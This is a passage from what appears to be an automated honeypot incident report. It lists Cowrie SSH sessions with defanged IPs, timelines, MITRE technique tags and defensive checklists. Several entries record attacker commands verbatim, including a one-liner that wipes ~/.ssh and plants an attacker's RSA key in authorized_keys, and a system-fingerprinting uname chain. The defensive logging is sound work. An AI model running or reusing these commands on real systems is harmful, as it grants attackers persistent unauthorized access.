| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:25:32` | `cowrie.session.connect` |
| `2026-07-26 15:25:33` | `cowrie.client.version` |
| `2026-07-26 15:25:33` | `cowrie.client.kex` |
| `2026-07-26 15:25:35` | `cowrie.login.success` |
| `2026-07-26 15:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]246` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff66a5099696

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-26 15:31 |
| **Last Seen** | 2026-07-26 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:31:35` | `cowrie.session.connect` |
| `2026-07-26 15:31:35` | `cowrie.client.version` |
| `2026-07-26 15:31:35` | `cowrie.client.kex` |
| `2026-07-26 15:31:36` | `cowrie.login.success` |
| `2026-07-26 15:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1029cfbee29e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-26 15:31 |
| **Last Seen** | 2026-07-26 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:31:35` | `cowrie.session.connect` |
| `2026-07-26 15:31:35` | `cowrie.client.version` |
| `2026-07-26 15:31:35` | `cowrie.client.kex` |
| `2026-07-26 15:31:36` | `cowrie.login.success` |
| `2026-07-26 15:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999606edc435

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-26 15:31 |
| **Last Seen** | 2026-07-26 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:31:40` | `cowrie.session.connect` |
| `2026-07-26 15:31:40` | `cowrie.client.version` |
| `2026-07-26 15:31:40` | `cowrie.client.kex` |
| `2026-07-26 15:31:40` | `cowrie.login.success` |
| `2026-07-26 15:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60fa7bf416c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-26 15:31 |
| **Last Seen** | 2026-07-26 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:31:42` | `cowrie.session.connect` |
| `2026-07-26 15:31:42` | `cowrie.client.version` |
| `2026-07-26 15:31:42` | `cowrie.client.kex` |
| `2026-07-26 15:31:42` | `cowrie.login.success` |
| `2026-07-26 15:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce7adca1ce6

| Field | Detail |
|---|---|
| **Source IP** | `112.197.2[.]116` |
| **First Seen** | 2026-07-26 15:32 |
| **Last Seen** | 2026-07-26 15:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:32:43` | `cowrie.session.connect` |
| `2026-07-26 15:32:43` | `cowrie.client.version` |
| `2026-07-26 15:32:43` | `cowrie.client.kex` |
| `2026-07-26 15:32:44` | `cowrie.login.success` |
| `2026-07-26 15:32:45` | `cowrie.session.params` |
| `2026-07-26 15:32:45` | `cowrie.command.input` |
| `2026-07-26 15:32:45` | `cowrie.log.closed` |
| `2026-07-26 15:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.197.2[.]116` to AbuseIPDB if not already reported
- [ ] Block `112.197.2[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-587bf2f0768d

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-26 15:36 |
| **Last Seen** | 2026-07-26 15:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:36:14` | `cowrie.session.connect` |
| `2026-07-26 15:36:15` | `cowrie.client.version` |
| `2026-07-26 15:36:15` | `cowrie.client.kex` |
| `2026-07-26 15:36:16` | `cowrie.login.success` |
| `2026-07-26 15:36:17` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50b18ac0a12a

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-07-26 15:36 |
| **Last Seen** | 2026-07-26 15:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:36:27` | `cowrie.session.connect` |
| `2026-07-26 15:36:28` | `cowrie.client.version` |
| `2026-07-26 15:36:28` | `cowrie.client.kex` |
| `2026-07-26 15:36:30` | `cowrie.login.success` |
| `2026-07-26 15:36:30` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8852a85e794a

| Field | Detail |
|---|---|
| **Source IP** | `76.133.97[.]153` |
| **First Seen** | 2026-07-26 15:38 |
| **Last Seen** | 2026-07-26 15:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:38:58` | `cowrie.session.connect` |
| `2026-07-26 15:38:59` | `cowrie.client.version` |
| `2026-07-26 15:38:59` | `cowrie.client.kex` |
| `2026-07-26 15:39:00` | `cowrie.login.success` |
| `2026-07-26 15:39:00` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.133.97[.]153` to AbuseIPDB if not already reported
- [ ] Block `76.133.97[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cee27d00b31

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-07-26 15:39 |
| **Last Seen** | 2026-07-26 15:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:39:44` | `cowrie.session.connect` |
| `2026-07-26 15:39:44` | `cowrie.client.version` |
| `2026-07-26 15:39:44` | `cowrie.client.kex` |
| `2026-07-26 15:39:47` | `cowrie.login.success` |
| `2026-07-26 15:39:47` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d175b3c899b1

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]246` |
| **First Seen** | 2026-07-26 15:41 |
| **Last Seen** | 2026-07-26 15:46 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:41:05` | `cowrie.session.connect` |
| `2026-07-26 15:41:07` | `cowrie.client.version` |
| `2026-07-26 15:41:07` | `cowrie.client.kex` |
| `2026-07-26 15:41:09` | `cowrie.login.success` |
| `2026-07-26 15:41:11` | `cowrie.session.params` |
| `2026-07-26 15:41:11` | `cowrie.command.input` |
| `2026-07-26 15:41:11` | `cowrie.command.failed` |
| `2026-07-26 15:41:12` | `cowrie.log.closed` |
| `2026-07-26 15:41:12` | `cowrie.session.params` |
| `2026-07-26 15:41:12` | `cowrie.command.input` |
| `2026-07-26 15:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]246` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745384871781

| Field | Detail |
|---|---|
| **Source IP** | `36.64.33[.]82` |
| **First Seen** | 2026-07-26 15:42 |
| **Last Seen** | 2026-07-26 15:42 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:42:26` | `cowrie.session.connect` |
| `2026-07-26 15:42:28` | `cowrie.client.version` |
| `2026-07-26 15:42:28` | `cowrie.client.kex` |
| `2026-07-26 15:42:34` | `cowrie.login.success` |
| `2026-07-26 15:42:37` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.33[.]82` to AbuseIPDB if not already reported
- [ ] Block `36.64.33[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39e5b2092f23

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-07-26 15:42 |
| **Last Seen** | 2026-07-26 15:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:42:43` | `cowrie.session.connect` |
| `2026-07-26 15:42:44` | `cowrie.client.version` |
| `2026-07-26 15:42:44` | `cowrie.client.kex` |
| `2026-07-26 15:42:46` | `cowrie.login.success` |
| `2026-07-26 15:42:46` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3972f35cf429

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-07-26 15:44 |
| **Last Seen** | 2026-07-26 15:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:44:07` | `cowrie.session.connect` |
| `2026-07-26 15:44:08` | `cowrie.client.version` |
| `2026-07-26 15:44:08` | `cowrie.client.kex` |
| `2026-07-26 15:44:09` | `cowrie.login.success` |
| `2026-07-26 15:44:10` | `cowrie.direct-tcpip.request` |
| `2026-07-26 15:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c4cdbc16b9f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-26 15:45 |
| **Last Seen** | 2026-07-26 15:45 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:45:22` | `cowrie.session.connect` |
| `2026-07-26 15:45:24` | `cowrie.client.version` |
| `2026-07-26 15:45:24` | `cowrie.client.kex` |
| `2026-07-26 15:45:36` | `cowrie.login.success` |
| `2026-07-26 15:45:42` | `cowrie.session.params` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.success` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:42` | `cowrie.command.input` |
| `2026-07-26 15:45:45` | `cowrie.log.closed` |
| `2026-07-26 15:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-085a89ca831d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]246` |
| **First Seen** | 2026-07-26 15:48 |
| **Last Seen** | 2026-07-26 15:48 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:48:21` | `cowrie.session.connect` |
| `2026-07-26 15:48:21` | `cowrie.client.version` |
| `2026-07-26 15:48:21` | `cowrie.client.kex` |
| `2026-07-26 15:48:24` | `cowrie.login.success` |
| `2026-07-26 15:48:25` | `cowrie.session.params` |
| `2026-07-26 15:48:25` | `cowrie.command.input` |
| `2026-07-26 15:48:25` | `cowrie.command.failed` |
| `2026-07-26 15:48:27` | `cowrie.log.closed` |
| `2026-07-26 15:48:28` | `cowrie.session.params` |
| `2026-07-26 15:48:28` | `cowrie.command.input` |
| `2026-07-26 15:48:28` | `cowrie.session.file_download` |
| `2026-07-26 15:48:28` | `cowrie.log.closed` |
| `2026-07-26 15:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]246` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ece2e22782c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]246` |
| **First Seen** | 2026-07-26 15:48 |
| **Last Seen** | 2026-07-26 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:48:34` | `cowrie.session.connect` |
| `2026-07-26 15:48:34` | `cowrie.client.version` |
| `2026-07-26 15:48:35` | `cowrie.client.kex` |
| `2026-07-26 15:48:36` | `cowrie.login.success` |
| `2026-07-26 15:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]246` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02df2f1dea75

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-26 15:51 |
| **Last Seen** | 2026-07-26 15:51 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:51:00` | `cowrie.session.connect` |
| `2026-07-26 15:51:01` | `cowrie.client.version` |
| `2026-07-26 15:51:01` | `cowrie.client.kex` |
| `2026-07-26 15:51:08` | `cowrie.login.success` |
| `2026-07-26 15:51:14` | `cowrie.session.params` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.success` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:14` | `cowrie.command.input` |
| `2026-07-26 15:51:16` | `cowrie.log.closed` |
| `2026-07-26 15:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2306bf75ff

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-26 15:58 |
| **Last Seen** | 2026-07-26 15:58 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 15:58:17` | `cowrie.session.connect` |
| `2026-07-26 15:58:18` | `cowrie.client.version` |
| `2026-07-26 15:58:18` | `cowrie.client.kex` |
| `2026-07-26 15:58:26` | `cowrie.login.success` |
| `2026-07-26 15:58:29` | `cowrie.session.params` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.success` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:29` | `cowrie.command.input` |
| `2026-07-26 15:58:30` | `cowrie.log.closed` |
| `2026-07-26 15:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f40fb3518f1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 16:00 |
| **Last Seen** | 2026-07-26 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:00:18` | `cowrie.session.connect` |
| `2026-07-26 16:00:18` | `cowrie.client.version` |
| `2026-07-26 16:00:18` | `cowrie.client.kex` |
| `2026-07-26 16:00:18` | `cowrie.login.success` |
| `2026-07-26 16:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-047975d01b2b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 16:00 |
| **Last Seen** | 2026-07-26 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:00:19` | `cowrie.session.connect` |
| `2026-07-26 16:00:19` | `cowrie.client.version` |
| `2026-07-26 16:00:19` | `cowrie.client.kex` |
| `2026-07-26 16:00:19` | `cowrie.login.success` |
| `2026-07-26 16:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1e51b471cf

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 16:00 |
| **Last Seen** | 2026-07-26 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:00:19` | `cowrie.session.connect` |
| `2026-07-26 16:00:19` | `cowrie.client.version` |
| `2026-07-26 16:00:19` | `cowrie.client.kex` |
| `2026-07-26 16:00:19` | `cowrie.login.success` |
| `2026-07-26 16:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50ce7443777

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 16:00 |
| **Last Seen** | 2026-07-26 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 16:00:19` | `cowrie.session.connect` |
